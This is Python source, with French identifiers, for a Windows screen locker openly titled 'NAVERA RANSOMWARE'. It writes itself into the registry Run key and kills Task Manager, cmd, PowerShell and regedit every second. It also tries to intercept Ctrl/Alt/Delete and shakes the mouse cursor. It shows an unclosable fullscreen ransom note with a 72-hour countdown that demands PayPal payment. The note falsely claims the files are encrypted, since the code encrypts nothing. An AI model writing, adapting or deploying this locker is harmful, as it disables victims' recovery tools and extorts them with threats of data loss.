import tkinter as tk
import psutil
import winsound
import time
import threading
import os
import winreg
import sys
import random
from pynput import keyboard
import pyautogui
import pygame
import urllib.request
from io import BytesIO
from PIL import Image, ImageTk
from datetime import datetime, timedelta


def ajouter_au_demarrage():
    nom = "NAVERA"
    chemin_script = os.path.abspath(sys.argv[0])
    clé = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_ALL_ACCESS
    )
    try:
        valeur, _ = winreg.QueryValueEx(clé, nom)
        if valeur == chemin_script:
            return
    except FileNotFoundError:
        pass
    winreg.SetValueEx(clé, nom, 0, winreg.REG_SZ, chemin_script)
    winreg.CloseKey(clé)


def jouer_musique_en_boucle(dossier="musique"):
    pygame.init()
    pygame.mixer.init()
    fichiers = [f for f in os.listdir(dossier) if f.endswith(".wav")]
    if not fichiers:
        return

    index = 0
    def play_next():
        nonlocal index
        fichier = os.path.join(dossier, fichiers[index])
        pygame.mixer.music.load(fichier)
        pygame.mixer.music.play()
        index = (index + 1) % len(fichiers)

    play_next()

    def boucle_musique():
        while True:
            if not pygame.mixer.music.get_busy():
                play_next()
            pygame.time.wait(500)

    threading.Thread(target=boucle_musique, daemon=True).start()


processus_interdits = [
    "taskmgr.exe", "cmd.exe", "powershell.exe", "regedit.exe",
    "ProcessHacker.exe", "mmc.exe", "SystemSettings.exe"
]

def surveiller_processus():
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                nom = proc.info['name']
                if nom and nom.lower() in processus_interdits:
                    proc.kill()
                    winsound.MessageBeep(winsound.MB_ICONHAND)
            except:
                continue
        time.sleep(1)


def bloquer_touches():
    def on_press(key):
        try:
            if key in [keyboard.Key.alt_l, keyboard.Key.alt_r,
                       keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
                       keyboard.Key.delete]:
                return False
        except:
            pass
    listener = keyboard.Listener(on_press=on_press)
    listener.start()


def trembler_curseur():
    while True:
        x, y = pyautogui.position()
        offset = random.randint(-5, 5)
        pyautogui.moveTo(x + offset, y + offset, duration=0.01)
        time.sleep(0.03)

def afficher_interface():
    root = tk.Tk()
    root.title("NAVERA RANSOMWARE")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')

    largeur = root.winfo_screenwidth()

    gauche = tk.Frame(root, width=largeur//4, bg='black')
    gauche.pack(side='left', fill='y')

    centre = tk.Frame(root, width=largeur//2, bg='black')
    centre.pack(side='left', fill='both', expand=True)

    droite = tk.Frame(root, width=largeur//4, bg='black')
    droite.pack(side='right', fill='y')


    message = (
        "[!] Tous vos fichiers importants ont été chiffrés avec un algorithme propre a PYRWV.\n\n"
        "Vous n'avez qu'une seule option pour les récupérer :\n"
        "Envoyer le paiement à l'adresse PayPal ci-dessous.\n\n"
        "Toute tentative de désinstallation ou d'arrêt de NAVERA\n"
        "entraînera la suppression immédiate de vos fichiers.\n\n"
        "Temps restant avant suppression définitive :"
    )
    tk.Label(gauche, text=message, font=('Consolas', 11), justify='left', bg='black',
             fg='white', wraplength=300).pack(padx=20, pady=40)

    
    timer_label = tk.Label(gauche, text="", font=('Consolas', 14, 'bold'), bg='black', fg='red')
    timer_label.pack(pady=10)

    deadline = datetime.now() + timedelta(hours=72)
    def update_timer():
        while True:
            remaining = deadline - datetime.now()
            if remaining.total_seconds() <= 0:
                timer_label.config(text="Temps écoulé.")
            else:
                h, m, s = str(remaining).split(":")
                timer_label.config(text=f"{h.zfill(2)}:{m}:{s[:2]}")
            time.sleep(1)

    threading.Thread(target=update_timer, daemon=True).start()

    
    tk.Label(centre, text="NAVERA RANSOMWARE", font=("Helvetica", 28, 'bold'), fg='red', bg='black').pack(pady=30)

    try:
        url = "https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Cadenas-ferme-rouge.svg/1200px-Cadenas-ferme-rouge.svg.png"
        with urllib.request.urlopen(url) as u:
            raw_data = u.read()
        im = Image.open(BytesIO(raw_data))
        im = im.resize((120, 120))
        photo = ImageTk.PhotoImage(im)
        img_label = tk.Label(centre, image=photo, bg='black')
        img_label.image = photo
        img_label.pack(pady=10)
    except:
        tk.Label(centre, text="🔒", font=("Helvetica", 60), bg='black', fg='red').pack()

    tk.Label(centre, text="SYSTEM LOCKED", font=("Helvetica", 18), bg='black', fg='white').pack(pady=10)
    tk.Label(centre, text="PAY TO UNLOCK YOUR FILES", font=("Helvetica", 16), bg='black', fg='white').pack(pady=5)

    tk.Label(centre, text="fictifpaypal@gmail.com", font=("Consolas", 18, 'bold'),
             bg="#1a1a1a", fg='white', relief="raised", bd=3, padx=30, pady=10).pack(pady=15)

    # Cr
    tk.Label(droite, text="CREDITS", font=("Helvetica", 16), bg='black', fg='white').pack(pady=40)
    tk.Label(droite, text="nxth9n", font=("Helvetica", 20, 'bold'), bg='black', fg='white').pack(pady=10)
    tk.Label(droite, text="https://github.com/nxthxndev", font=("Consolas", 11), fg="blue", bg='black').pack(pady=10)

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()

    # main
if __name__ == "__main__":
    ajouter_au_demarrage()
    jouer_musique_en_boucle("morse")
    threading.Thread(target=surveiller_processus, daemon=True).start()
    threading.Thread(target=bloquer_touches, daemon=True).start()
    threading.Thread(target=trembler_curseur, daemon=True).start()
    afficher_interface()
